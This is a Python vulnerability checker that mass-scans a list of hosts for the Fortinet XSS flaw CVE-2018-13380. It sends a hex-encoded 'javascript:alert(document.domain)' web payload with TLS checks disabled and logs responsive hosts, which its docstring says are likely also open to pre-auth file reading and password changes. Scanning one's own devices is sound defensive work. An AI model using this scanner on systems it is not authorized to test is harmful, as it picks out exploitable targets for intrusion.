#!/usr/bin/env python3
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


description = """
Check if Fortinet device is vulnerable to XSS (CVE-2018-13380)
if the target is vulnerable, it is also probably vulnerable to
* CVE-2018-13379 (Pre-auth arbitrary file reading) and
* CVE-2018-13382 (Post-auth heap overflow) and
* CVE-2018-13383 (Modify any users password with magic key)
since all those were fixed on the same update.
"""

# define global vars
url = ("https://{}/remote/loginredir"
       "?redir=6a6176617363726970743a616c65727428646f63756d656e742e6"
       "46f6d61696e29")
headers = {"User-Agent": "Your user agent string"}
detect_string = ('document.location=decodeURIComponent'
                 '("javascript%3Aalert%28document.domain%29")')

# suppress InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def test_vuln(fqdn_or_ip, outfile):
    try:
        response = requests.get(url.format(fqdn_or_ip),
                                headers=headers,
                                verify=False,
                                timeout=(3.05, 15))
    except Exception:
        return
    if response.status_code == 200 and detect_string in response.text:
        print("\t[!] Vulnerable: {}".format(url.format(fqdn_or_ip)))
        outfile.write(fqdn_or_ip + "\n")


parser = argparse.ArgumentParser(description=description)
parser.add_argument("hostfile", type=argparse.FileType(mode="r"),
                    help="A file containing one FQDN/IP per line")
parser.add_argument("outfile", type=argparse.FileType(mode="x"),
                    help="The file to which vulnerable URLs will be written. "
                         "File must not exist.")
args = parser.parse_args()


for line in args.hostfile:
    line = line.strip()
    print("Testing {}".format(line))
    test_vuln(line, args.outfile)
